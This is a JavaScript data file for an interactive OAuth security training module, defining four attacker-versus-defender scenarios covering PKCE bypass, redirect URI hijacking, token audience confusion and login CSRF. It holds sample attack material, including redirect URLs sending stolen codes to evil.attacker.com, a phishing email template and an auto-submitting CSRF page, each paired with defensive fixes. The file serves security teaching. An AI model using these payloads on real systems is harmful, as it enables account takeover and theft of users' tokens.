/**
 * Story Scenarios for Dual Perspective Module
 * Narrative-driven attack scenarios with branching paths
 */

const STORY_SCENARIOS = [
  {
    id: 'pkce_bypass',
    title: 'The PKCE Bypass',
    category: 'Code Flow Attacks',
    difficulty: 'beginner',
    estimatedTime: '5 min',
    description: 'A public client without PKCE protection leaves authorization codes vulnerable to interception.',

    // Configuration that makes this attack possible
    vulnerableConfig: {
      requirePkce: false
    },

    // Configuration that blocks this attack
    secureConfig: {
      requirePkce: true,
      pkceMethod: 'S256'
    },

    attacker: {
      intro: "You've discovered a web application that uses OAuth 2.0 for authentication. Through reconnaissance, you notice the authorization requests don't include any `code_challenge` parameter...",
      goal: "Intercept an authorization code and use it to gain access to a victim's account.",

      steps: [
        {
          id: 'recon',
          title: 'Reconnaissance',
          narrative: "You examine the OAuth authorization request in the browser's developer tools. The URL looks like this:",
          codeSnippet: `GET /authorize?
  response_type=code
  &client_id=vulnerable-app
  &redirect_uri=https://app.example.com/callback
  &scope=openid profile
  &state=abc123`,
          observation: "Notice: There's no `code_challenge` parameter. This means PKCE is not being used!",
          hint: "Without PKCE, authorization codes can be intercepted and replayed by an attacker.",
          choices: [
            { id: 'check_network', text: 'Position yourself to intercept network traffic', next: 'intercept_setup' },
            { id: 'check_referrer', text: 'Look for referrer header leakage', next: 'referrer_check' }
          ]
        },
        {
          id: 'intercept_setup',
          title: 'Setting Up the Intercept',
          narrative: "You position yourself on the same network as potential victims (coffee shop WiFi, corporate network via phishing, etc.). You set up a packet capture to monitor OAuth redirects.",
          observation: "You're ready to capture authorization codes from the redirect URL.",
          choices: [
            { id: 'wait', text: 'Wait for a victim to authenticate', next: 'capture_code' }
          ]
        },
        {
          id: 'referrer_check',
          title: 'Checking Referrer Headers',
          narrative: "You check if the application has external links that might leak the authorization code via the Referer header. You find a 'Share on Twitter' button on the callback page!",
          observation: "The redirect URL with the code might be leaked in the Referer header when users click external links.",
          choices: [
            { id: 'exploit_referrer', text: 'Wait for referrer leakage', next: 'capture_code' }
          ]
        },
        {
          id: 'capture_code',
          title: 'Code Captured!',
          narrative: "Success! You've captured an authorization code from a victim's OAuth flow:",
          codeSnippet: `Captured redirect:
https://app.example.com/callback?code=authz_7x8y9z&state=abc123

Authorization code: authz_7x8y9z`,
          observation: "You now have a valid authorization code. Time to exchange it for tokens!",
          choices: [
            { id: 'exchange', text: 'Race to exchange the code', next: 'exchange_code' }
          ]
        },
        {
          id: 'exchange_code',
          title: 'Exchanging the Code',
          narrative: "You quickly send a token request to the authorization server:",
          codeSnippet: `POST /token
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code
&code=authz_7x8y9z
&redirect_uri=https://app.example.com/callback
&client_id=vulnerable-app`,
          configCheck: 'requirePkce',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The server responds with an error:",
            codeSnippet: `{
  "error": "invalid_request",
  "error_description": "code_verifier is required"
}`,
            explanation: "With PKCE enabled, the server requires a `code_verifier` that matches the original `code_challenge`. Since you don't have this value (it was generated by the legitimate client), you cannot exchange the stolen code!"
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The server responds with tokens:",
            codeSnippet: `{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "ref_abc123..."
}`,
            explanation: "Without PKCE, the server has no way to verify that you're the same client that initiated the request. You now have full access to the victim's account!"
          }
        }
      ]
    },

    defender: {
      intro: "You're the security engineer responsible for your company's OAuth implementation. A security audit has flagged that your public clients aren't using PKCE...",
      goal: "Configure the authorization server to require PKCE and prevent code interception attacks.",

      steps: [
        {
          id: 'review_current',
          title: 'Review Current Configuration',
          narrative: "You examine the current OAuth client configuration:",
          codeSnippet: `Client: vulnerable-app
Type: Public (SPA)
PKCE Required: false
Redirect URIs: https://app.example.com/callback`,
          observation: "The client is a Single Page Application (public client) but PKCE is not required. This is a vulnerability!",
          hint: "Public clients cannot securely store a client_secret, so PKCE is the only way to protect the authorization code.",
          showControls: ['requirePkce', 'pkceMethod']
        },
        {
          id: 'enable_pkce',
          title: 'Enable PKCE',
          narrative: "You update the configuration to require PKCE:",
          instruction: "Toggle 'Require PKCE' to ON and ensure the method is set to 'S256'.",
          configCheck: 'requirePkce',
          onSecure: {
            title: 'Configuration Updated',
            narrative: "Excellent! PKCE is now required. The new flow will look like this:",
            codeSnippet: `// Client generates PKCE values
code_verifier = random(43-128 chars)
code_challenge = base64url(sha256(code_verifier))

// Authorization request now includes:
GET /authorize?
  ...
  &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM
  &code_challenge_method=S256`,
            explanation: "Now the authorization code is cryptographically bound to the code_verifier. Only the client that knows the verifier can exchange the code!"
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "PKCE is still disabled. Your clients remain vulnerable to code interception attacks.",
            instruction: "Enable PKCE to continue."
          }
        },
        {
          id: 'verify_protection',
          title: 'Verify Protection',
          narrative: "Let's verify the protection by simulating an attack:",
          observation: "With PKCE enabled, even if an attacker intercepts the authorization code, they cannot exchange it without the code_verifier.",
          codeSnippet: `// Attacker's request (missing code_verifier):
POST /token
grant_type=authorization_code
&code=stolen_code_xyz

// Server response:
{
  "error": "invalid_request",
  "error_description": "code_verifier is required"
}`,
          explanation: "The attack is blocked! The code_verifier is a high-entropy secret that never leaves the client, so attackers cannot guess or obtain it."
        }
      ]
    }
  },

  {
    id: 'redirect_hijack',
    title: 'The Redirect Hijack',
    category: 'Code Flow Attacks',
    difficulty: 'intermediate',
    estimatedTime: '7 min',
    description: 'Loose redirect URI validation enables attackers to steal authorization codes via phishing.',

    vulnerableConfig: {
      strictRedirectUri: false,
      allowWildcardRedirects: true
    },

    secureConfig: {
      strictRedirectUri: true,
      allowWildcardRedirects: false,
      httpsOnlyRedirects: true
    },

    attacker: {
      intro: "You've found an OAuth client that seems to have loose redirect URI validation. Time to see if you can redirect authorization codes to your own server...",
      goal: "Craft a malicious authorization URL that redirects the victim's authorization code to your server.",

      steps: [
        {
          id: 'test_redirect',
          title: 'Testing Redirect Validation',
          narrative: "First, let's see what redirect URIs the authorization server accepts. You try different variations:",
          codeSnippet: `// Original registered URI:
https://app.example.com/callback

// Test variations:
https://app.example.com/callback?extra=param    // Maybe allowed?
https://app.example.com/callback/../other       // Path traversal?
https://evil.com                                // Different domain?
https://app.example.com.evil.com/callback       // Subdomain trick?`,
          observation: "The server seems to accept URIs as long as they START with the registered domain...",
          choices: [
            { id: 'craft_url', text: 'Craft a malicious authorization URL', next: 'craft_attack' }
          ]
        },
        {
          id: 'craft_attack',
          title: 'Crafting the Attack URL',
          narrative: "You create a phishing page and set up an authorization URL that redirects to your server:",
          codeSnippet: `// Your malicious URL:
https://auth.example.com/authorize?
  response_type=code
  &client_id=vulnerable-app
  &redirect_uri=https://evil.attacker.com/steal
  &scope=openid profile
  &state=abc123

// Or using subdomain trick:
&redirect_uri=https://app.example.com.evil.com/callback`,
          observation: "Now you need to get victims to click this link...",
          choices: [
            { id: 'phish', text: 'Send phishing emails', next: 'phishing' }
          ]
        },
        {
          id: 'phishing',
          title: 'Phishing Campaign',
          narrative: "You send a convincing phishing email:",
          codeSnippet: `Subject: Action Required: Verify Your Account

Dear User,

Please verify your account by clicking below:
[Verify Now] <- Links to your malicious auth URL

This is an automated security check.`,
          observation: "Victims who click will authenticate normally, but the code will be sent to YOUR server!",
          choices: [
            { id: 'capture', text: 'Wait for victims', next: 'capture_redirect' }
          ]
        },
        {
          id: 'capture_redirect',
          title: 'Capturing the Redirect',
          narrative: "A victim clicks your link, authenticates, and...",
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The authorization server rejects the request:",
            codeSnippet: `{
  "error": "invalid_request",
  "error_description": "redirect_uri does not match registered URIs"
}`,
            explanation: "With strict redirect URI validation, the server only accepts EXACT matches of pre-registered URIs. Your malicious URI was rejected!"
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The victim is redirected to YOUR server with their authorization code:",
            codeSnippet: `// Request to your server:
GET https://evil.attacker.com/steal?code=authz_victim123&state=abc123

// You captured:
Authorization Code: authz_victim123`,
            explanation: "With loose redirect validation, the server accepted your malicious URI. You now have the victim's authorization code and can exchange it for tokens!"
          }
        }
      ]
    },

    defender: {
      intro: "Your security team has received reports of phishing attacks targeting your OAuth flow. Investigation reveals that attackers are able to redirect authorization codes to their servers...",
      goal: "Implement strict redirect URI validation to prevent open redirect attacks.",

      steps: [
        {
          id: 'investigate',
          title: 'Investigate the Issue',
          narrative: "You examine the authorization server logs and find suspicious redirect URIs:",
          codeSnippet: `// Suspicious requests:
redirect_uri=https://app.example.com.evil.com/callback
redirect_uri=https://evil.com/?https://app.example.com
redirect_uri=https://app.example.com/callback/../../../evil`,
          observation: "The server is accepting redirect URIs that don't exactly match the registered values!",
          showControls: ['strictRedirectUri', 'allowWildcardRedirects', 'httpsOnlyRedirects']
        },
        {
          id: 'fix_validation',
          title: 'Implement Strict Validation',
          narrative: "You need to configure strict redirect URI validation:",
          instruction: "Enable 'Strict URI Matching' and disable 'Allow Wildcards'.",
          configCheck: 'strictRedirectUri',
          onSecure: {
            title: 'Validation Enabled',
            narrative: "Excellent! The server will now only accept exact URI matches:",
            codeSnippet: `// Registered:
https://app.example.com/callback

// Accepted: https://app.example.com/callback
// Rejected: https://app.example.com/callback?param=value
// Rejected: https://app.example.com/callback/
// Rejected: https://evil.com`,
            explanation: "Strict matching ensures that even subtle variations are rejected, preventing redirect manipulation attacks."
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without strict validation, attackers can still manipulate redirect URIs.",
            instruction: "Enable strict validation to continue."
          }
        },
        {
          id: 'test_fix',
          title: 'Verify the Fix',
          narrative: "Let's test that the attack is now blocked:",
          codeSnippet: `// Attacker's request:
GET /authorize?
  redirect_uri=https://evil.attacker.com/steal
  &client_id=vulnerable-app
  ...

// Server response:
{
  "error": "invalid_request",
  "error_description": "redirect_uri must exactly match a registered URI"
}`,
          observation: "The attack is blocked! Only exact matches of pre-registered URIs are accepted."
        }
      ]
    }
  },

  {
    id: 'audience_confusion',
    title: 'The Audience Confusion',
    category: 'Token Security',
    difficulty: 'intermediate',
    estimatedTime: '6 min',
    description: 'Tokens without audience validation can be replayed across different services.',

    vulnerableConfig: {
      validateAudience: false
    },

    secureConfig: {
      validateAudience: true
    },

    attacker: {
      intro: "You've legitimately obtained an access token for one service in an organization. You wonder if you can use it to access OTHER services that use the same authorization server...",
      goal: "Replay a token against a different resource server than it was intended for.",

      steps: [
        {
          id: 'examine_token',
          title: 'Examine Your Token',
          narrative: "You decode the JWT access token you received:",
          codeSnippet: `{
  "iss": "https://auth.company.com",
  "sub": "user_12345",
  "aud": "frontend-app",
  "scope": "read:profile",
  "exp": 1699999999
}`,
          observation: "The token's audience (aud) is 'frontend-app', but you want to access 'admin-api'...",
          hint: "If the admin-api doesn't validate the audience claim, it might accept this token!",
          choices: [
            { id: 'try_replay', text: 'Try using the token against admin-api', next: 'attempt_replay' }
          ]
        },
        {
          id: 'attempt_replay',
          title: 'Attempting Token Replay',
          narrative: "You send a request to the admin API using your token:",
          codeSnippet: `GET https://admin-api.company.com/users
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...`,
          configCheck: 'validateAudience',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The admin API rejects the token:",
            codeSnippet: `{
  "error": "invalid_token",
  "error_description": "Token audience 'frontend-app' does not match 'admin-api'"
}`,
            explanation: "The admin API properly validates the audience claim. Since your token was issued for 'frontend-app', it cannot be used against 'admin-api'!"
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The admin API accepts the token!",
            codeSnippet: `{
  "users": [
    {"id": "1", "email": "admin@company.com", "role": "admin"},
    {"id": "2", "email": "user@company.com", "role": "user"}
  ]
}`,
            explanation: "The admin API didn't check the audience claim! Your token, which was only meant for the frontend app, gives you access to the admin API. This is a serious security breach!"
          }
        }
      ]
    },

    defender: {
      intro: "Your organization runs multiple microservices that all use the central OAuth server. A security review has found that tokens might be usable across service boundaries...",
      goal: "Configure resource servers to properly validate token audience claims.",

      steps: [
        {
          id: 'understand_issue',
          title: 'Understanding the Risk',
          narrative: "You review how tokens flow through your architecture:",
          codeSnippet: `User -> Frontend App (aud: frontend-app)
     -> Admin API (should only accept aud: admin-api)
     -> User API (should only accept aud: user-api)

Current behavior: All APIs accept ANY token from our auth server!`,
          observation: "If an attacker gets a low-privilege token, they could use it against high-privilege APIs!",
          showControls: ['validateAudience']
        },
        {
          id: 'enable_validation',
          title: 'Enable Audience Validation',
          instruction: "Enable 'Validate Audience' to ensure each service only accepts tokens intended for it.",
          configCheck: 'validateAudience',
          onSecure: {
            title: 'Validation Enabled',
            narrative: "Each resource server now validates the audience claim:",
            codeSnippet: `// Admin API configuration:
{
  "expected_audience": "admin-api",
  "validate_audience": true
}

// Token validation:
if (token.aud !== "admin-api") {
  throw new Error("Invalid audience");
}`,
            explanation: "Now each service will only accept tokens that were specifically issued for it. Cross-service token replay is blocked!"
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without audience validation, tokens can be used across services.",
            instruction: "Enable audience validation to continue."
          }
        }
      ]
    }
  },

  {
    id: 'csrf_login',
    title: 'The Login CSRF',
    category: 'Code Flow Attacks',
    difficulty: 'advanced',
    estimatedTime: '8 min',
    description: 'Without state parameter validation, attackers can force victims to log in with the attacker\'s account.',

    vulnerableConfig: {
      requireStateParam: false
    },

    secureConfig: {
      requireStateParam: true
    },

    attacker: {
      intro: "You want to access a victim's data, but instead of stealing their credentials, you have a clever idea: what if you could make them log into YOUR account and then they'd give you their data?",
      goal: "Execute a CSRF attack that links the victim's session to your OAuth account.",

      steps: [
        {
          id: 'get_code',
          title: 'Get Your Own Auth Code',
          narrative: "First, you initiate an OAuth flow with YOUR account and capture the authorization code BEFORE it's exchanged:",
          codeSnippet: `// You authenticate and capture:
https://app.example.com/callback?code=attacker_code_xyz

// You DON'T complete the flow - save this code!
Authorization Code: attacker_code_xyz`,
          observation: "You now have an unused authorization code for YOUR account.",
          choices: [
            { id: 'craft_csrf', text: 'Craft a CSRF attack page', next: 'create_attack' }
          ]
        },
        {
          id: 'create_attack',
          title: 'Creating the CSRF Page',
          narrative: "You create a malicious page that auto-submits the callback with your code:",
          codeSnippet: `<html>
  <body onload="document.forms[0].submit()">
    <form method="GET" action="https://app.example.com/callback">
      <input type="hidden" name="code" value="attacker_code_xyz">
    </form>
    <p>Loading...</p>
  </body>
</html>`,
          observation: "When a victim loads this page, their browser will automatically submit your authorization code to the app!",
          choices: [
            { id: 'deploy', text: 'Deploy and wait for victims', next: 'execute_attack' }
          ]
        },
        {
          id: 'execute_attack',
          title: 'Executing the Attack',
          narrative: "A victim visits your page while logged into the application...",
          configCheck: 'requireStateParam',
          onSecure: {
            title: 'Attack Blocked!',
            narrative: "The application rejects the callback:",
            codeSnippet: `Error: Invalid state parameter

The state parameter in the callback does not match
the state from the original authorization request.`,
            explanation: "The application uses a state parameter to bind the authorization request to the user's session. Since the victim never initiated this flow, there's no matching state in their session!"
          },
          onVulnerable: {
            title: 'Attack Succeeded!',
            narrative: "The application accepts the callback and logs the victim into YOUR account!",
            codeSnippet: `// Victim's session is now linked to YOUR account!
// When they upload files, enter payment info, etc.
// It all goes to YOUR account!`,
            explanation: "Without state validation, the app can't distinguish between a legitimate callback and a CSRF attack. The victim is now using your account, and any data they enter belongs to you!"
          }
        }
      ]
    },

    defender: {
      intro: "Users are reporting strange behavior - their accounts seem connected to unknown OAuth identities. Your security team suspects a CSRF vulnerability...",
      goal: "Implement state parameter validation to prevent CSRF attacks on the OAuth callback.",

      steps: [
        {
          id: 'analyze',
          title: 'Analyze the Vulnerability',
          narrative: "You examine the OAuth callback handler:",
          codeSnippet: `// Current callback handler:
app.get('/callback', (req, res) => {
  const code = req.query.code;
  // Exchange code for tokens...
  // No state validation!
});`,
          observation: "The callback doesn't validate the state parameter! This allows CSRF attacks.",
          showControls: ['requireStateParam']
        },
        {
          id: 'implement_state',
          title: 'Implement State Validation',
          instruction: "Enable 'Require State Parameter' to prevent CSRF attacks.",
          configCheck: 'requireStateParam',
          onSecure: {
            title: 'State Validation Enabled',
            narrative: "The proper flow now looks like this:",
            codeSnippet: `// 1. Generate state and store in session:
const state = crypto.randomBytes(32).toString('hex');
req.session.oauthState = state;

// 2. Include state in authorization URL:
/authorize?...&state=abc123xyz

// 3. Validate state in callback:
if (req.query.state !== req.session.oauthState) {
  throw new Error('Invalid state');
}`,
            explanation: "The state parameter is a cryptographically random value tied to the user's session. An attacker cannot guess it, so CSRF attacks are blocked!"
          },
          onVulnerable: {
            title: 'Still Vulnerable',
            narrative: "Without state validation, CSRF attacks remain possible.",
            instruction: "Enable state validation to continue."
          }
        }
      ]
    }
  }
];

// Helper to get scenario by ID
function getScenarioById(id) {
  return STORY_SCENARIOS.find(s => s.id === id);
}

// Helper to get difficulty badge class
function getDifficultyClass(difficulty) {
  const classes = {
    beginner: 'badge-success',
    intermediate: 'badge-warning',
    advanced: 'badge-error'
  };
  return classes[difficulty] || 'badge-neutral';
}

// Export
if (typeof window !== 'undefined') {
  window.STORY_SCENARIOS = STORY_SCENARIOS;
  window.getScenarioById = getScenarioById;
  window.getDifficultyClass = getDifficultyClass;
}
